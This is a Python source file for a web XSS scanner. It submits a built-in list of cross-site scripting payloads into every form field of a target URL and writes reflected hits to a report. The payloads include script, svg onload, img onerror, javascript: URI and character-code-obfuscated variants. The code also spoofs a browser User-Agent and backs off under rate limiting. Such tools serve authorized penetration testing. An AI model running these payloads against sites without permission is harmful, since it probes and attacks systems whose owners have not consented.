import time
import random
import requests
from bs4 import BeautifulSoup
from colorama import Fore
import re
import os
import logging
from urllib.parse import urljoin, urlencode, urlparse
from typing import List, Dict, Tuple, Set

# Set up logging for errors only
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

class XSSScanner:
    """Advanced XSS vulnerability scanner with improved detection and performance."""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Enhanced payload set for better detection
        self.payloads = [
            # Basic script tags
            '<script>alert("XSS")</script>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            
            # SVG payloads
            '<svg onload="alert(1)">',
            '<svg/onload=alert("XSS")>',
            
            # IMG payloads
            '<img src="x" onerror="alert(1)">',
            '<img src=x onerror=alert("XSS")>',
            
            # Event handlers
            '"><img src=x onerror=alert(1)>',
            '\'"--></style></script><script>alert("XSS")</script>',
            
            # JavaScript protocol
            'javascript:alert("XSS")',
            'JaVaScRiPt:alert("XSS")',
            
            # Attribute-based
            '" onmouseover="alert(1)"',
            '\' onmouseover="alert(1)"',
            
            # Encoded payloads
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '%3Cscript%3Ealert("XSS")%3C/script%3E',
            
            # Template literals
            '${alert("XSS")}',
            '{{7*7}}',
            
            # Advanced bypasses
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
            '<script>setTimeout("alert(\\"XSS\\")",1000)</script>'
        ]
        
        self.xss_found = []
        
    def is_valid_url(self, url: str) -> bool:
        """Validate URL format."""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False
    
    def detect_xss_in_response(self, response: requests.Response, payload: str) -> bool:
        """
        Enhanced XSS detection in response content.
        
        Args:
            response: HTTP response object
            payload: XSS payload used
            
        Returns:
            True if XSS is detected, False otherwise
        """
        try:
            content = response.text.lower()
            payload_lower = payload.lower()
            
            # Check for direct payload reflection
            if payload_lower in content:
                # Additional checks to reduce false positives
                
                # Check if payload is in a script context
                script_patterns = [
                    r'<script[^>]*>.*?' + re.escape(payload_lower) + r'.*?</script>',
                    r'javascript:.*?' + re.escape(payload_lower),
                    r'on\w+\s*=.*?' + re.escape(payload_lower)
                ]
                
                for pattern in script_patterns:
                    if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                        return True
                
                # Check for HTML context injection
                html_patterns = [
                    r'<[^>]*' + re.escape(payload_lower) + r'[^>]*>',
                    r'<svg[^>]*onload[^>]*>',
                    r'<img[^>]*onerror[^>]*>'
                ]
                
                for pattern in html_patterns:
                    if re.search(pattern, content, re.IGNORECASE):
                        return True
                
                # Check for attribute context
                if re.search(r'(?:href|src|action)\s*=\s*["\']?[^"\']*' + re.escape(payload_lower), content, re.IGNORECASE):
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error in XSS detection: {str(e)}")
            return False
    
    def extract_forms(self, response: requests.Response, base_url: str) -> List[Dict]:
        """
        Extract forms from HTML response.
        
        Args:
            response: HTTP response object
            base_url: Base URL for resolving relative URLs
            
        Returns:
            List of form dictionaries
        """
        forms = []
        
        try:
            soup = BeautifulSoup(response.text, "html.parser")
            html_forms = soup.find_all("form")
            
            for form in html_forms:
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                
                # Resolve relative URLs
                form_url = urljoin(base_url, action) if action else base_url
                
                # Extract input fields
                inputs = form.find_all(["input", "textarea", "select"])
                fields = {}
                
                for input_field in inputs:
                    name = input_field.get("name")
                    if name:
                        # Get default value or empty string
                        value = input_field.get("value", "")
                        input_type = input_field.get("type", "text").lower()
                        
                        # Skip certain input types
                        if input_type not in ["submit", "button", "reset", "file"]:
                            fields[name] = value
                
                if fields:  # Only include forms with testable fields
                    forms.append({
                        'url': form_url,
                        'method': method,
                        'fields': fields,
                        'form_html': str(form)
                    })
                    
        except Exception as e:
            logger.error(f"Error extracting forms: {str(e)}")
        
        return forms
    
    def test_form_for_xss(self, form: Dict, base_url: str) -> List[Tuple[str, str, str]]:
        """
        Test a single form for XSS vulnerabilities.
        
        Args:
            form: Form dictionary
            base_url: Base URL for the target
            
        Returns:
            List of vulnerability tuples (payload, field, form_url)
        """
        vulnerabilities = []
        
        for payload in self.payloads:
            for field_name in form['fields'].keys():
                try:
                    # Prepare test data
                    test_data = form['fields'].copy()
                    test_data[field_name] = payload
                    
                    # Submit form with improved error handling
                    if form['method'] == 'post':
                        response = self.session.post(
                            form['url'],
                            data=test_data,
                            timeout=10,
                            allow_redirects=True
                        )
                    else:
                        response = self.session.get(
                            form['url'],
                            params=test_data,
                            timeout=10,
                            allow_redirects=True
                        )
                    
                    # Handle expected error responses gracefully
                    if response.status_code in [422, 429, 403, 406, 418]:
                        # These are expected responses from security mechanisms
                        if response.status_code == 429:
                            # Rate limited - add extra delay
                            time.sleep(random.uniform(3, 6))
                        continue
                    
                    response.raise_for_status()
                    
                    # Check for XSS
                    if self.detect_xss_in_response(response, payload):
                        vulnerabilities.append((payload, field_name, form['url']))
                        logger.info(f"XSS found: {form['url']} - {field_name} - {payload}")
                        break  # Move to next field after finding vulnerability
                
                except requests.exceptions.RequestException as e:
                    # Only log unexpected errors, not common HTTP responses
                    if hasattr(e, 'response') and e.response is not None:
                        status_code = e.response.status_code
                        # Don't log expected HTTP errors like rate limiting or validation errors
                        if status_code not in [422, 429, 403, 406, 418]:
                            logger.error(f"Request error testing {form['url']}: {str(e)}")
                        
                        # Handle rate limiting with backoff
                        if status_code == 429:
                            time.sleep(min(5, random.uniform(2, 4)))  # Wait 2-4 seconds
                    else:
                        logger.error(f"Request error testing {form['url']}: {str(e)}")
                    continue
                except Exception as e:
                    logger.error(f"Unexpected error testing form: {str(e)}")
                    continue
                
                # Enhanced rate limiting with adaptive delays
                time.sleep(random.uniform(1.0, 2.0))
        
        return vulnerabilities
    
    def save_results(self, vulnerabilities: List[Tuple], forms: List[Dict]) -> None:
        """Save XSS test results to file."""
        if not vulnerabilities:
            return
        
        try:
            os.makedirs("output", exist_ok=True)
            
            with open("output/xss.txt", "w", encoding='utf-8') as f:
                f.write("=== XSS Vulnerability Report ===\n\n")
                f.write(f"Total vulnerabilities found: {len(vulnerabilities)}\n\n")
                
                for i, (payload, field, form_url) in enumerate(vulnerabilities, 1):
                    f.write(f"--- Vulnerability #{i} ---\n")
                    f.write(f"URL: {form_url}\n")
                    f.write(f"Vulnerable Field: {field}\n")
                    f.write(f"Payload: {payload}\n")
                    
                    # Find and include form HTML
                    matching_form = next((form for form in forms if form['url'] == form_url), None)
                    if matching_form:
                        f.write(f"Method: {matching_form['method'].upper()}\n")
                        f.write(f"Form HTML:\n{matching_form['form_html']}\n")
                    
                    f.write("\n" + "="*50 + "\n\n")
                    
        except Exception as e:
            logger.error(f"Error saving results: {str(e)}")

def scan(url: str) -> None:
    """
    Main XSS scanning function with improved detection and error handling.
    
    Args:
        url: Target URL to scan for XSS vulnerabilities
    """
    if not url or not url.strip():
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: URL cannot be empty")
        return
    
    scanner = XSSScanner()
    
    # Validate URL
    if not scanner.is_valid_url(url):
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error: Invalid URL format")
        return
    
    try:
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Starting XSS scan for: {Fore.GREEN}{url}")
        
        # Get initial page
        response = scanner.session.get(url, timeout=15)
        response.raise_for_status()
        
        # Extract forms
        forms = scanner.extract_forms(response, url)
        
        if not forms:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No forms found on the target page")
            return
        
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} Found {len(forms)} form(s) to test")
        
        # Test each form for XSS
        all_vulnerabilities = []
        
        for i, form in enumerate(forms, 1):
            print(f"{Fore.CYAN}[*] Testing form {i}/{len(forms)}: {form['url']}")
            
            vulnerabilities = scanner.test_form_for_xss(form, url)
            all_vulnerabilities.extend(vulnerabilities)
            
            # Add to scanner's found list for compatibility
            for vuln in vulnerabilities:
                scanner.xss_found.append(vuln)
        
        # Report results
        if all_vulnerabilities:
            unique_vulns = len(set((v[2], v[1]) for v in all_vulnerabilities))  # Unique by URL and field
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Found: {Fore.RED}{len(all_vulnerabilities)} total, {unique_vulns} unique")
            print(f"{Fore.MAGENTA}[+] {Fore.CYAN}-{Fore.WHITE} XSS Report: {Fore.GREEN}Saved to /output/xss.txt")
            
            # Save detailed results
            scanner.save_results(all_vulnerabilities, forms)
        else:
            print(f"{Fore.YELLOW}[!] {Fore.CYAN}-{Fore.WHITE} No XSS vulnerabilities found")
        
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Request timed out")
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Connection error - check URL and network")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} HTTP error: {e.response.status_code}")
    except Exception as e:
        logger.error(f"XSS scan error: {str(e)}")
        print(f"{Fore.RED}[-] {Fore.CYAN}-{Fore.WHITE} Error during XSS scan: {str(e)}")
    finally:
        # Clean up session
        scanner.session.close()
